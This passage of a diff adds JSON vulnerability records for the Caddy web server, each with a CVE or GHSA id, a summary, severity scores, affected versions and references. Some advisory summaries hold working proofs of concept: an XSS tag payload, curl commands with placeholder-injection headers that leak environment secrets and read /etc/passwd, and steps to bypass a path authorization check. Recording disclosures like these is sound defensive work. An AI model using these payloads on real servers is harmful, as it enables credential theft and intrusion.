+      "revision": "sha256:3294043a11b9815459046f5704c10870799c6e5102836c00bbf96f079a01a339",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-52845",
+      "aliases": [
+        "GHSA-f59h-q822-g45g"
+      ],
+      "title": "Caddy: FastCGI header normalization bypass in `forward_auth copy_headers`",
+      "summary": "Caddy is an extensible server platform that uses TLS by default. Prior to 2.11.4, forward_auth copy_headers deletes the exact client-supplied identity header before copying the trusted value from the auth gateway. But when the request later goes through php_fastcgi, Caddy normalizes HTTP headers into CGI variables by replacing - with _. This lets a client send an underscore alias that survives the forward_auth delete step but becomes the same PHP/FastCGI variable. Result: a remote client can inject or sometimes override identity/group headers trusted by PHP/FastCGI applications behind Caddy. This vulnerability is fixed in 2.11.4.",
+      "published_at": "2026-06-08T22:25:00.000Z",
+      "modified_at": "2026-07-24T13:26:47.000Z",
+      "severity": {
+        "level": "high",
+        "score": 8.1,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00445,
+        "percentile": 0.39263,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-287",
+        "CWE-290",
+        "CWE-444"
+      ],
+      "affected": [
+        {
+          "product": "caddy",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "2.11.4"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-f59h-q822-g45g",
+          "type": "advisory"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-52845",
+          "type": "web"
+        },
+        {
+          "url": "https://access.redhat.com/security/cve/CVE-2026-52845",
+          "type": "advisory"
+        },
+        {
+          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2491907",
+          "type": "web"
+        },
+        {
+          "url": "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-52845.json",
+          "type": "web"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-f59h-q822-g45g",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-52845",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-52845",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-52845",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-52845",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-f59h-q822-g45g",
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-f59h-q822-g45g",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:6cd890237782851408e995a9806d30368012ce6ba3a2667bfb1fca78988c586c",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-52844",
+      "aliases": [
+        "GHSA-qrp7-cvwr-j2c6"
+      ],
+      "title": "Caddy: Windows `file_server` path authorization bypass via encoded backslash",
+      "summary": "Caddy is an extensible server platform that uses TLS by default. Prior to 2.11.4, on Windows, Caddy path matchers treat /private\\secret.txt as outside /private/*, but file_server later resolves the same request path as private\\secret.txt on disk. An unauthenticated remote client can bypass Caddy path-scoped auth/deny routes protecting /private/*. This vulnerability is fixed in 2.11.4.",
+      "published_at": "2026-06-08T22:24:46.000Z",
+      "modified_at": "2026-07-20T21:02:10.000Z",
+      "severity": {
+        "level": "high",
+        "score": 7.5,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00619,
+        "percentile": 0.5026,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-22",
+        "CWE-284"
+      ],
+      "affected": [
+        {
+          "product": "caddy",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "2.11.4"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-qrp7-cvwr-j2c6",
+          "type": "advisory"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-52844",
+          "type": "web"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-qrp7-cvwr-j2c6",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-52844",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-52844",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-52844",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-52844",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-qrp7-cvwr-j2c6",
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-qrp7-cvwr-j2c6",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:6cd890237782851408e995a9806d30368012ce6ba3a2667bfb1fca78988c586c",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-52846",
+      "aliases": [
+        "GHSA-vcc4-2c75-vc9v"
+      ],
+      "title": "Caddy: stripHTML template function bypass",
+      "summary": "Caddy is an extensible server platform that uses TLS by default. Prior to 2.11.4, Caddy’s stripHTML template function cannot reliably remove all HTML tags from input strings. Certain malformed HTML, such as <<>img src=x onerror=alert()>, can bypass the tag-stripping logic, potentially leaving dangerous content in the output if it is later rendered as HTML. This may allow client-side XSS in cases where untrusted strings are rendered unsafely. This vulnerability is fixed in 2.11.4.",
+      "published_at": "2026-06-08T22:24:11.000Z",
+      "modified_at": "2026-06-25T12:42:16.519Z",
+      "severity": {
+        "level": "medium",
+        "score": 4.2,
+        "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00248,
+        "percentile": 0.16235,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-116"
+      ],
+      "affected": [
+        {
+          "product": "caddy",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "2.11.4"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-vcc4-2c75-vc9v",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-vcc4-2c75-vc9v",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-52846",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-52846",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-52846",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-52846",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-vcc4-2c75-vc9v",
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-vcc4-2c75-vc9v",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:29dca3d5f8a5de2474f7722195584c0f257f12a8d5aca61f0680301d1ffe707d",
+      "note": null
+    },
+    {
+      "id": "GHSA-gx7w-56w6-g48x",
+      "aliases": [],
+      "title": "Remote Admin Authorization Bypass on PKI Endpoints via Prefix-Based Path Matching",
+      "summary": "## AI Disclosure\r\n\r\n  I used an LLM to help review the source code, reason about attack surface, and help draft and refine this report.\r\n  I manually validated the finding by reproducing it locally, confirming the vulnerable code path, and verifying the HTTP behavior with `curl -v`.\r\n\r\n  ## Summary\r\n\r\n  Caddy's remote admin access control performs path authorization using prefix matching:\r\n\r\n  - [`admin.go`](/caddy/admin.go#L719): `strings.HasPrefix(r.URL.Path, allowedPath)`\r\n\r\n  This allows a client certificate authorized only for `/pki/ca/prod` to access sibling PKI resources whose paths merely share the same prefix, such as `/pki/ca/prod-backup`.\r\n\r\n  This is an authorization bug in Caddy's source code, not a misconfiguration issue. The configured policy is more restrictive than the behavior that Caddy actually enforces.\r\n\r\n  ## Affected Component\r\n\r\n  Remote admin access control for PKI admin endpoints.\r\n\r\n  Relevant code:\r\n\r\n  - [`admin.go`](/caddy/admin.go#L687)\r\n  - [`admin.go`](/caddy/admin.go#L719)\r\n  - [`modules/caddypki/adminapi.go`](/caddy/modules/caddypki/adminapi.go#L68)\r\n  - [`modules/caddypki/adminapi.go`](/caddy/modules/caddypki/adminapi.go#L164)\r\n\r\n  ## Root Cause\r\n\r\n  In `RemoteAdmin.enforceAccessControls()`, allowed paths are checked like this:\r\n\r\n  ```go\r\n  for _, allowedPath := range accessPerm.Paths {\r\n  \tif strings.HasPrefix(r.URL.Path, allowedPath) {\r\n  \t\tpathFound = true\r\n  \t\tbreak\r\n  \t}\r\n  }\r\n```\r\n\r\n  This does not enforce a path-segment boundary.\r\n\r\n  So if the allowed path is:\r\n\r\n  /pki/ca/prod\r\n\r\n  then all of the following are treated as authorized:\r\n\r\n  - /pki/ca/prod-backup\r\n  - /pki/ca/prod1\r\n  - /pki/ca/prodanything\r\n\r\n  For PKI admin endpoints, the CA ID is taken directly from the request path:\r\n\r\n  - modules/caddypki/adminapi.go:164\r\n\r\n  So /pki/ca/prod-backup is interpreted as CA ID prod-backup, even though only /pki/ca/prod was intended to be allowed.\r\n\r\n  ## Security Impact\r\n\r\n  A remote admin client certificate restricted to one PKI CA path can access other CA resources with the same prefix.\r\n\r\n  This breaks least-privilege remote admin policies and results in authenticated authorization bypass.\r\n\r\n  ## Minimal Configuration\r\n\r\n  File: repro.json\r\n```\r\n  {\r\n    \"admin\": {\r\n      \"listen\": \"127.0.0.1:2019\",\r\n      \"identity\": {\r\n        \"identifiers\": [\"localhost\"],\r\n        \"issuers\": [\r\n          { \"module\": \"internal\" }\r\n        ]\r\n      },\r\n      \"remote\": {\r\n        \"listen\": \"127.0.0.1:2021\",\r\n        \"access_control\": [\r\n          {\r\n            \"public_keys\": [\"<CLIENT_CERT_BASE64_DER>\"],\r\n            \"permissions\": [\r\n              {\r\n                \"methods\": [\"GET\"],\r\n                \"paths\": [\"/pki/ca/prod\"]\r\n              }\r\n            ]\r\n          }\r\n        ]\r\n      }\r\n    },\r\n    \"apps\": {\r\n      \"pki\": {\r\n        \"certificate_authorities\": {\r\n          \"prod\": {\r\n            \"name\": \"prod\"\r\n          },\r\n          \"prod-backup\": {\r\n            \"name\": \"prod-backup\"\r\n          }\r\n        }\r\n      }\r\n    }\r\n  }\r\n\r\n```\r\n  ## Reproduction Steps From Scratch\r\n\r\n  ### 1. Generate a client certificate\r\n```\r\n  openssl req -x509 -newkey rsa:2048 -nodes -days 365 \\\r\n    -subj '/CN=remote-admin-client' \\\r\n    -keyout client.key \\\r\n    -out client.crt\r\n\r\n```\r\n\r\n  ### 2. Convert the client certificate to base64 DER\r\n\r\n  CLIENT_CERT_B64=\"$(openssl x509 -in client.crt -outform der | base64 | tr -d '\\n')\"\r\n\r\n  ### 3. Put that value into repro.json\r\n\r\n  Replace:\r\n\r\n  <CLIENT_CERT_BASE64_DER>\r\n\r\n  with the value of CLIENT_CERT_B64.\r\n\r\n  ### 4. Run Caddy\r\n\r\n  go run ./cmd/caddy run --config ./repro.json\r\n\r\n  ### 5. Confirm access to the intended allowed path\r\n```\r\n  curl -vk \\\r\n    --resolve localhost:2021:127.0.0.1 \\\r\n    --cert ./client.crt \\\r\n    --key ./client.key \\\r\n    https://localhost:2021/pki/ca/prod\r\n```\r\n  Expected result:\r\n\r\n  - HTTP/1.1 200 OK\r\n\r\n  ### 6. Request a different CA whose path shares the same prefix\r\n```\r\n  curl -vk \\\r\n    --resolve localhost:2021:127.0.0.1 \\...",
+      "published_at": "2026-05-13T14:40:35.000Z",
+      "modified_at": "2026-05-19T19:36:14.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 4.3,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-863"
+      ],
+      "affected": [
+        {
+          "product": "caddy",
+          "ranges": [
+            {
+              "introduced": "2.0.0",
+              "fixed": "2.11.3"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-gx7w-56w6-g48x",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-gx7w-56w6-g48x",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-gx7w-56w6-g48x",
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-gx7w-56w6-g48x",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:2825b0f76513c5be0dd1964b163676b465f469625e4cab4b8e37019ac5c3de28",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-45692",
+      "aliases": [
+        "GHSA-x5w9-xh9r-mvfc"
+      ],
+      "title": "Caddy: Remote Admin Authorization Bypass in `/config` API via Array Index Normalization",
+      "summary": "Caddy is an extensible server platform that uses TLS by default. From 2.4.0 until 2.11.3, the authorization layer and the /config traversal layer do not agree on what object the path refers to. In this case, a path authorized for one config object is accepted, but then resolves to a different config object during traversal. This happens because the authorization layer uses string prefix matching and the /config traversal layer parses array indices numerically using strconv.Atoi(). This vulnerability is fixed in 2.11.3.",
+      "published_at": "2026-05-13T14:40:02.000Z",
+      "modified_at": "2026-07-20T13:43:06.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 5.4,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00241,
+        "percentile": 0.15385,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-187",
+        "CWE-863"
+      ],
+      "affected": [
+        {
+          "product": "caddy",
+          "ranges": [
+            {
+              "introduced": "2.4.0",
+              "fixed": "2.11.3"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-x5w9-xh9r-mvfc",
+          "type": "advisory"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-45692",
+          "type": "web"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-x5w9-xh9r-mvfc",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-45692",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-45692",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-45692",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-45692",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-x5w9-xh9r-mvfc",
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-x5w9-xh9r-mvfc",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:3b6e18d99e6ba1f077b8bf68bfb56f8de1e0720f08dc8198ede995444efff7b9",
+      "note": null
+    },
+    {
+      "id": "GHSA-wwhq-w58m-w29c",
+      "aliases": [],
+      "title": "Caddy CVE-2026-30852 Fix Bypass",
+      "summary": "# \r\n\r\n## TL;DR\r\n\r\nCVE-2026-30852 fixed double expansion in `vars_regexp` when the variable key is a placeholder (e.g. `{http.vars.x}`). The fix does NOT protect literal key names (e.g. `tenant_id`). An attacker injects `{env.AWS_SECRET_ACCESS_KEY}` or `{file./etc/passwd}` via a request header → Caddy expands it on the second pass → secrets leaked in response headers.\r\n\r\n**Affected:** Caddy v2.11.0 through v2.11.2 (latest). All versions since the CVE-2026-30852 fix.\r\n\r\n## Root Cause\r\n\r\n`modules/caddyhttp/vars.go`, lines 215-217:\r\n\r\n```go\r\nvalExpanded = varStr\r\nif !fromPlaceholder {\r\n    valExpanded = repl.ReplaceAll(varStr, \"\")  // ← SECOND EXPANSION\r\n}\r\n```\r\n\r\nSame issue at line 358-360 in `MatchVarsRE`.\r\n\r\n`fromPlaceholder` is `false` when the variable key is a literal string (not wrapped in `{}`). The fix only protects `fromPlaceholder=true`.\r\n\r\n### Expansion chain:\r\n\r\n1. Config: `vars tenant_id {http.request.header.X-Tenant-ID}`\r\n2. Request header: `X-Tenant-ID: {env.SECRET}`\r\n3. **Pass 1** (`VarsMiddleware.ServeHTTP`, line 63): `repl.ReplaceAll(\"{http.request.header.X-Tenant-ID}\", \"\")` → resolves to literal string `{env.SECRET}`. Stored in vars map.\r\n4. **Pass 2** (`VarsMatcher.MatchWithError`, line 217): `repl.ReplaceAll(\"{env.SECRET}\", \"\")` → resolves to the actual secret value.\r\n5. Leaked value reflected in response header `X-Tenant-ID` or forwarded to backend via `reverse_proxy`.\r\n\r\n## Impact\r\n\r\n- **Environment variable disclosure:** `{env.AWS_SECRET_ACCESS_KEY}`, `{env.DATABASE_URL}`, etc.\r\n- **Arbitrary file read (up to 1MB):** `{file./etc/passwd}`, `{file./proc/self/environ}`\r\n- **System info:** `{system.hostname}`, `{system.os}`\r\n- **Full env dump in one request:** `{file./proc/self/environ}`\r\n\r\n## Realistic Attack Scenario\r\n\r\nAPI gateway pattern - Caddy captures a tenant ID header, validates it with `vars_regexp`, and reflects it in response headers or forwards to a backend. This is a common production pattern for multi-tenant routing.\r\n\r\n```\r\n# Caddyfile\r\n:8080 {\r\n    vars tenant_id {http.request.header.X-Tenant-ID}\r\n    @has_tenant vars_regexp tenant tenant_id (.+)\r\n    handle @has_tenant {\r\n        header X-Tenant-ID \"{re.tenant.1}\"\r\n        reverse_proxy tenant-backend:8080\r\n    }\r\n    respond \"Missing X-Tenant-ID header\" 400\r\n}\r\n```\r\n\r\n```\r\n# docker-compose.yml\r\nservices:\r\n  caddy:\r\n    image: caddy:2.11.2\r\n    ports:\r\n      - \"8080:8080\"\r\n    volumes:\r\n      - ./Caddyfile:/etc/caddy/Caddyfile:ro\r\n    environment:\r\n      - SECRET_API_KEY=sk-SUPER-SECRET-KEY-12345\r\n      - DATABASE_URL=postgresql://admin:p4ssw0rd@db.internal:5432/production\r\n      - AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\r\n      - INTERNAL_TOKEN=eyJhbGciOiJIUzI1NiJ9.INTERNAL_ONLY\r\n```\r\n\r\nAttacker sends: `X-Tenant-ID: {env.AWS_SECRET_ACCESS_KEY}`\r\nResponse contains: `X-Tenant-ID: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY`\r\n\r\n## Reproduce\r\n\r\n```bash\r\ndocker compose up -d\r\nsleep 2\r\n\r\n# Normal request - works as expected\r\ncurl -sI -H \"X-Tenant-ID: acme-corp\" http://localhost:8080/ | grep X-Tenant\r\n# X-Tenant-Id: acme-corp\r\n\r\n# Leak env var via response header\r\ncurl -sI -H \"X-Tenant-ID: {env.SECRET_API_KEY}\" http://localhost:8080/ | grep X-Tenant\r\n# X-Tenant-Id: sk-SUPER-SECRET-KEY-12345\r\n\r\n# Leak AWS credentials\r\ncurl -sI -H \"X-Tenant-ID: {env.AWS_SECRET_ACCESS_KEY}\" http://localhost:8080/ | grep X-Tenant\r\n# X-Tenant-Id: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\r\n\r\n# Read arbitrary file\r\ncurl -sI -H \"X-Tenant-ID: {file./etc/passwd}\" http://localhost:8080/ | grep X-Tenant\r\n\r\n# Dump ALL env vars (Linux)\r\ncurl -s -H \"X-Tenant-ID: {file./proc/self/environ}\" http://localhost:8080/\r\n```\r\n\r\n## Confirmed Test Output (Caddy v2.11.2)\r\n\r\n```\r\n$ curl -sI -H \"X-Tenant-ID: acme-corp\" http://localhost:8080/ | grep -i x-tenant\r\nX-Tenant-Id: acme-corp\r\nX-Routed-To: tenant-acme-corp\r\n\r\n$ curl -sI -H \"X-Tenant-ID: {env.SECRET_API_KEY}\" http://localhost:8080/ | grep -i x-tenant\r\nX-Tenant-Id: sk-SUPER-SECRET-KEY-12345\r\nX-Routed-To: tenant-sk-SU...",
+      "published_at": "2026-05-13T14:39:55.000Z",
+      "modified_at": "2026-05-19T19:35:48.000Z",
+      "severity": {
+        "level": "high",
+        "score": null,
+        "vector": null,
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-917"
+      ],
+      "affected": [
+        {
+          "product": "caddy",
+          "ranges": [
+            {
+              "introduced": "0",
+              "last_affected": "2.11.2"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-wwhq-w58m-w29c",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-wwhq-w58m-w29c",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-wwhq-w58m-w29c",
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-wwhq-w58m-w29c",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:9b7723808f00aecadf27813e4ef6506b2cec928f675cb48103f0e939bf42e437",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-45135",
+      "aliases": [
+        "GHSA-m675-2p33-xv9g"
+      ],
+      "title": "Caddy: Unsafe Unicode Handling in FastCGI splitPos Allows Execution of Non-PHP Files",
+      "summary": "Caddy is an extensible server platform that uses TLS by default. From 2.7.0 until 2.11.3, the FastCGI transport's splitPos() in modules/caddyhttp/reverseproxy/fastcgi/fastcgi.go misuses golang.org/x/text/search with search.IgnoreCase when the request path contains a non-ASCII byte. Two distinct flaws in that fallback let an attacker mislead Caddy's FastCGI splitting into treating a non-.php (or other configured split_path extension) file as a script. In any deployment where the attacker can place content into a file served via FastCGI (uploads, file storage, etc.), this can be escalated to remote code execution by crafting a URL whose path triggers either flaw. This vulnerability is fixed in 2.11.3.",
+      "published_at": "2026-05-13T14:39:28.000Z",
+      "modified_at": "2026-07-20T13:42:55.000Z",
+      "severity": {
+        "level": "high",
+        "score": 8.1,
+        "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00676,
+        "percentile": 0.52793,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-20",
+        "CWE-176",
+        "CWE-178"
+      ],
+      "affected": [
+        {
+          "product": "caddy",
+          "ranges": [
+            {
+              "introduced": "2.7.0",
+              "fixed": "2.11.3"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-m675-2p33-xv9g",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/php/frankenphp/security/advisories/GHSA-3g8v-8r37-cgjm",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/php/frankenphp/security/advisories/GHSA-g966-83w7-6w38",
+          "type": "advisory"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-45135",
+          "type": "web"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-m675-2p33-xv9g",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-45135",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-45135",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-45135",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-45135",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-m675-2p33-xv9g",
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-m675-2p33-xv9g",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:4e45ea40aada662f18ca4f5a9e284192684f0583727085bdfb32f2301435f301",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-30852",
+      "aliases": [
+        "GHSA-m2w3-8f23-hxxf"
+      ],
+      "title": "Caddy: vars_regexp double-expands user input, leaking env vars and files",
+      "summary": "Caddy is an extensible server platform that uses TLS by default. From version 2.7.5 to before version 2.11.2, the vars_regexp matcher in vars.go:337 double-expands user-controlled input through the Caddy replacer. When vars_regexp matches against a placeholder like {http.request.header.X-Input}, the header value gets resolved once (expected), then passed through repl.ReplaceAll() again (the bug). This means an attacker can put {env.DATABASE_URL} or {file./etc/passwd} in a request header and the server will evaluate it, leaking environment variables, file contents, and system info. This issue has been patched in version 2.11.2.",
+      "published_at": "2026-03-06T01:59:32.000Z",
+      "modified_at": "2026-03-09T18:24:55.495Z",
+      "severity": {
+        "level": "medium",
+        "score": 5.5,
+        "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N/E:P",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00466,
+        "percentile": 0.40909,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-74",
+        "CWE-200"
+      ],
+      "affected": [
+        {
+          "product": "caddy",
+          "ranges": [
+            {
+              "introduced": "2.7.5",
+              "fixed": "2.11.2"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-m2w3-8f23-hxxf",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/caddyserver/caddy/pull/5408",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/caddyserver/caddy/releases/tag/v2.11.2",
+          "type": "release-notes"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-30852",
+          "type": "web"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-m2w3-8f23-hxxf",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-30852",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-30852",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-30852",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-30852",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-m2w3-8f23-hxxf",
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-m2w3-8f23-hxxf",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:e49ce01333c00d5e98abdb1b7f974eddb8a7d6c94b894b465af0a833a0c8d3ae",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-30851",
+      "aliases": [
+        "GHSA-7r4p-vjf4-gxv4"
+      ],
+      "title": "Caddy forward_auth copy_headers Does Not Strip Client-Supplied Headers, Allowing Identity Injection and Privilege Escalation",
+      "summary": "Caddy is an extensible server platform that uses TLS by default. From version 2.10.0 to before version 2.11.2, forward_auth copy_headers does not strip client-supplied headers, allowing identity injection and privilege escalation. This issue has been patched in version 2.11.2.",
+      "published_at": "2026-03-06T01:59:07.000Z",
+      "modified_at": "2026-03-09T18:24:49.691Z",
+      "severity": {
+        "level": "high",
+        "score": 8.1,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00285,
+        "percentile": 0.21317,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-287",
+        "CWE-345"
+      ],
+      "affected": [
+        {
+          "product": "caddy",
+          "ranges": [
+            {
+              "introduced": "2.10.0",
+              "fixed": "2.11.2"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-7r4p-vjf4-gxv4",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/caddyserver/caddy/issues/6610",
+          "type": "web"
+        },
+        {
+          "url": "https://github.com/caddyserver/caddy/pull/6608",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/caddyserver/caddy/pull/7545",
+          "type": "fix"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-30851",
+          "type": "web"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-7r4p-vjf4-gxv4",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-30851",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-30851",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-30851",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-30851",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-7r4p-vjf4-gxv4",
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-7r4p-vjf4-gxv4",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:3449615b78ca89cb5466b58b5d6ca98e70bedaeb09295ed30f1bccff3adeab60",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-27586",
+      "aliases": [
